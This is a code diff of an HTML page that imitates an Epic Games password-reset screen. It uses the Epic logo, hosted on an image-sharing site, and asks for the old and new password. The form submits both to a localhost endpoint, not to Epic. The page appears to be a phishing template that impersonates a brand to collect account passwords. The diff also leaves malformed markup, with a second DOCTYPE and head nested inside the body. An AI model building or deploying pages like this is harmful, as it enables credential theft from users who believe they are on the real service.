@@ -135,58 +135,64 @@
     </style>
 </head>
 <body>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Epic Games Password Reset</title>
+    <link rel="stylesheet" href="epicgames-html-password.css">
+</head>
+<body>
     <div class="container">
+        <!-- Logo Section -->
         <div class="logo">
             <img src="https://i.ibb.co/PTf4kjw/epic-games-logo.jpg" alt="Epic Games Logo">
         </div>
+
+        <!-- Instructions -->
         <div class="MuiTypography-root MuiTypography-body1 mui-o497ds">
             Enter your new password for your Epic Games account.
         </div>
-        <form
-</form><form action="http://localhost:3000/reset-password" method="POST">
-    <!-- Old Password Section -->
-    <div class="form-group">
-        <label for="oldPassword">Old Password</label>
-        <input type="password" id="oldPassword" name="oldPassword" placeholder="Enter your old password" required>
-        <span class="show-password" onclick="togglePassword('oldPassword')">👁</span>
-    </div>
 
-    <!-- New Password Section -->
-    <div class="form-group">
-        <label for="newPassword">New Password</label>
-        <input type="password" id="newPassword" name="newPassword" placeholder="Enter your new password" required>
-        <span class="show-password" onclick="togglePassword('newPassword')">👁</span>
-    </div>
+        <!-- Form Section -->
+        <form action="http://localhost:3000/reset-password" method="POST">
+            <!-- Old Password Section -->
+            <div class="form-group">
+                <label for="oldPassword">Old Password</label>
+                <input type="password" id="oldPassword" name="oldPassword" placeholder="Enter your old password" required>
+                <span class="show-password" onclick="togglePassword('oldPassword')">👁</span>
+            </div>
 
-    <!-- Password Requirements -->
-    <div class="requirements">
-        <strong>Password Requirements:</strong>
-        <ul>
-            <li>Must not use any of your last 5 passwords</li>
-            <li>Must contain at least 7 characters</li>
-            <li>Must include at least 1 letter</li>
-            <li>Must include at least 1 number</li>
-            <li>Must not contain spaces</li>
-        </ul>
-    </div>
+            <!-- New Password Section -->
+            <div class="form-group">
+                <label for="newPassword">New Password</label>
+                <input type="password" id="newPassword" name="newPassword" placeholder="Enter your new password" required>
+                <span class="show-password" onclick="togglePassword('newPassword')">👁</span>
+            </div>
 
-    <!-- Submit Button -->
-    <button type="submit" class="submit-btn">Reset Password</button>
-</form>
-
+            <!-- Password Requirements -->
+            <div class="requirements">
+                <strong>Password Requirements:</strong>
+                <ul>
+                    <li>Must not use any of your last 5 passwords</li>
+                    <li>Must contain at least 7 characters</li>
+                    <li>Must include at least 1 letter</li>
+                    <li>Must include at least 1 number</li>
+                    <li>Must not contain spaces</li>
                 </ul>
             </div>
 
             <!-- Submit Button -->
-            <button type="submit">Submit</button>
+            <button type="submit" class="submit-btn">Reset Password</button>
         </form>
     </div>
 
     <script>
+        // Toggle Password Visibility
         function togglePassword(fieldId) {
             const field = document.getElementById(fieldId);
-            const type = field.type === 'password' ? 'text' : 'password';
-            field.type = type;
+            field.type = field.type === 'password' ? 'text' : 'password';
         }
     </script>
 </body>
